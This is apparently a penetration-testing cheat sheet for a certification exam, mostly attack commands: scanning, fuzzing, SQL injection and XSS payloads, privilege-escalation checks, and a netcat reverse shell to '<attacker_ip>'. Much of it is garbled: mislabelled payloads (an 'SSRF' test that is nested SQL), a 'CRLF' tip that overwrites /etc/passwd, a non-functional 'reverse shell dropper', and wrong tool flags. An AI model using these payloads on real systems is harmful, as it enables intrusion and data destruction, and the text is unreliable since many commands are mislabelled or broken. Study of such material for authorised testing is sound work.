# CPTS All-In-One Attack Cheat Sheet
> Rapid enumeration to full compromise for {target}. Skip theory, execute commands.

## Attack Workflow

1. **Recon**: Get live IPs and subdomains.
2. **Port Scan**: Identify open services and flags.
3. **Web Analysis**: Parse headers, find params, scan for fuzzing targets.
4. **Exploitation**: Test SQLi, XSS, IDOR, SSRF, RCE against specific endpoints.
5. **Persistence**: Check logs, drop shells.

## Core Commands

### 1. Network Enumeration & Fingerprinting
```bash
# Identify host type and OS hints
nmap -sC -sV --version-intensity 3 -T4 -oN report.txt {target}

# Check if reverse shell possible (TCP vs UDP)
nc -zv {target} 22 443 80 8080

# Detect common ports
nc -zv {target} 80 443 8080 8443 3389
```

### 2. Web Enumeration & Fuzzing
```bash
# Resolve subdomains aggressively
dig +short *.domain.com 2>/dev/null | while read ip; do nmap -p 80 -sV $ip; done > subnets.txt

# Directory Fuzzing (brute force sub-paths)
for i in $(seq 1 500); do gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -e .txt -e .html -e .xml -e .php 2>/dev/null; done

# Parameter Discovery (find params for testing)
for i in $(seq 1 50); do ffuf -u "http://$ip/dir" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/paramnames.txt 2>/dev/null; done
```

### 3. Vulnerability Testing (One-Liners)
```bash
# SQL Injection Test (Booru-style)
curl -s -A "Mozilla/5.0" "http://$ip/index.php?id=1' OR 1=1" | grep -i "error\|warning\|mysql"

# SQL Injection Test (Complex)
curl -s -A "Mozilla/5.0" "http://$ip/index.php?id=1' AND (SELECT 1 FROM (SELECT COUNT(*) FROM users) a, (SELECT COUNT(*) FROM users) b)"

# SQL Injection Test (SqliFuzzer)
sqli-fuzz -u "http://$ip/index.php" -d "id=1' OR 'x'='x" -t /usr/share/wordlists/databases/mysql.sqlmap.txt

# XSS Test (Storage)
curl -s -A "Mozilla/5.0" "http://$ip/index.php?id=1<script>alert(1)</script>"

# XSS Test (Reflected)
curl -s -A "Mozilla/5.0" "http://$ip/index.php?id=1?input=<img src=x onerror=alert(1)>"

# SSRF Test (Internal IPs)
curl -s -A "Mozilla/5.0" "http://$ip/index.php?id=1' AND (SELECT * FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM information_schema.TABLES WHERE TABLE_NAME LIKE 'mysql%')) a WHERE 1=1)b WHERE 1=1)c WHERE 1=1)d WHERE 1=1)e WHERE 1=1)f WHERE 1=1)g WHERE 1=1)h WHERE 1=1" | grep -i "127\.0\.0\.1\|localhost\|mysql"

# RCE via SQLi (DropDB)
curl -s -A "Mozilla/5.0" "http://$ip/index.php?id=1' AND (SELECT COUNT(*), GROUP_CONCAT(CREATE_USER,0x7e,USER()) FROM INFORMATION_SCHEMA.USER) AS A GROUP BY USER()"
```

### 4. Privilege Escalation & Persistence
```bash
# Check for sudoers
cat /etc/sudoers | grep -i "root\|apache\|nginx"

# Check for world-writable files
find / -type f -perm -002 2>/dev/null

# Check for hidden files
ls -la /var/log/apache2/

# Check for environment variables
env | grep -i "shell\|command"

# Drop reverse shell via nc (if nc allowed)
echo -e "/bin/sh; rm -rf /tmp/shell; nc -e /bin/sh <attacker_ip> 4444" | nc <victim_ip> <port>
```

## Tips & Shortcuts

1. **Fuzzing Speed**: Use `-j4` for 4 concurrent threads in `gobuster`/`ffuf`.
2. **Regex Extraction**: `grep -E "http|https|/"` in logs.
3. **Port Flagging**: `-sV` gives version, `-sC` runs defaults (Nessus-like).
4. **Session Cookies**: `curl -s -c cookies.txt -b cookies.txt` to manage state.
5. **Proxy Setup**: `gobuster proxy -e http://$ip/index.php?id=1' AND (SELECT * FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM information_schema.TABLES WHERE TABLE_NAME LIKE 'mysql%')) a WHERE 1=1)b WHERE 1=1)c WHERE 1=1)d WHERE 1=1)e WHERE 1=1)f WHERE 1=1)g WHERE 1=1)h WHERE 1=1`
6. **Timeouts**: `-T 4` in Nmap for slow scanning, `-T0` for stealth.
7. **Output Parsing**: `-oG` for gobuster to save JSON/HTML for easy parsing.
8. **CRLF Injection**: `curl -s -A "Mozilla/5.0" "http://$ip/index.php?id=1"; echo > /etc/passwd`

## Common Mistakes

1. **Ignoring HTTP 404**: Don't stop at 404, 403, or 500 are often signs of directory structure.
2. **No Context**: Don't test SQLi without knowing the param type.
3. **No Version Check**: Don't assume CVE without checking server version (`nmap -sV`).
4. **No SSL**: Don't forget to check HTTPS ports for downgrades.
5. **No Logs**: Don't forget to check `/var/log/apache2/error.log`.
6. **No Proxy Chains**: Don't use direct connection if proxy is set up.
7. **No Fuzzing**: Don't guess params, let the tool find them.
8. **No Persistence**: Don't forget to drop reverse shell for exam credit.

## Mini Automation Scripts

### Bash: Port Scan & Service Version
```bash
#!/bin/bash
target=${target}
for port in $(seq 1 65535); do
  if nmap -p $port -sC -sV -oG-$port $target | grep -q "open"; then
    echo "$port Open: $(nmap -p $port -sC -sV -oG-$port $target | grep -oP '^\S+\s+(tcp|udp).*'"$port)"
  fi
done
```

### Bash: Directory Fuzzing with Output
```bash
#!/bin/bash
target=${target}
gobuster dir -u "http://${target}" -w /usr/share/wordlists/dirb/common.txt -e .txt -e .html -e .xml -e .php 2>/dev/null | tee gobuster.txt
```

### Python: Reverse Shell Dropper
```python
import subprocess, socket, os
socket.setdefaulttimeout(10)
os.popen('bash')
```

### Python: SQLi Fuzzer
```python
import urllib.request, urllib.parse
import json

def test_sql(target, params):
    try:
        req = urllib.request.Request(f"http://{target}/index.php?id=1' OR 1=1")
        with urllib.request.urlopen(req) as response:
            print(json.dumps(response.read()))
    except Exception as e:
        print(e)
```

## Final Checklist

- [ ] Is `{target}` fully enumerated?
- [ ] Are all open ports scanned?
- [ ] Are all subdomains resolved?
- [ ] Are all vulnerabilities tested?
- [ ] Is reverse shell dropped?
- [ ] Are logs parsed?
- [ ] Is the exam time managed?